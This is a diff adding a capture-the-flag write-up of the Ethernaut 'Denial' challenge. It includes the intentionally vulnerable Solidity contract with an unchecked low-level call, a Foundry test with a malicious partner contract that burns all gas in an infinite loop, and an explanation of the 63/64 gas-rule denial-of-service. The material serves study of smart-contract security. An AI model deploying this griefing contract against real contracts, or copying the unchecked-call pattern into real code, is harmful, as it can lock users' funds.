@@ -848,7 +848,66 @@ Link: https://ethernaut.openzeppelin.com/level/0x2427aF06f748A6adb651aCaB0cA8FbC
 ### Contracts
 - `src/Week8-9/Ethernaut_Denial.sol`
 ```
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
 ```
 - `test/Week8-9/Ethernaur_Denial.t.sol`
+```
+contract DenialTest is Test {
+    Denial denial;
+    MaliciousPartner partner;
+
+    function setUp() public {
+        denial = new Denial();
+        partner = new MaliciousPartner();
+        vm.deal(address(denial), 1_000 ether);
+        denial.setWithdrawPartner(address(partner));
+    }
+
+    function testExploit() public {
+        denial.withdraw();
+        vm.expectRevert();
+    }
+}
+
+contract MaliciousPartner {
+    uint256 public random;
+
+    receive() external payable {
+        while (true) {
+            random++;
+        }
+    }
+}
+```
 
 ### Exploit
+To complete this challenge, we have to deny the owner from withdrawing funds when they call `withdraw`, essentially carrying out a DOS attack. Exploiting this contract requires some understanding of EIP-150 and the 63/64 Rule for gas. When `partner.call{value: amountToSend}("");` is executed, 63/64 of the available gas will be forwarded to `partner`, while 1/64 of the gas remains with the contract. By setting `partner` as a malicious contract with an infinite loop in the `receive` function, when `partner` receives ether from the contract, this infinite loop will execute and continue running until all the gas is consumed before the `payable(owner).transfer(amountToSend);` is executed. Since the return value was ignored in the low level `.call`, the failure in the `partner` would go unchecked in the event of any failure. The main contract will try to execute the transfer to `owner` but this will fail as the contract only has 1/64 gas, which is insufficient to continue executing the rest of the function. An error `EvmError: OutOfGas` will be thrown and `owner` will not be able to receive funds
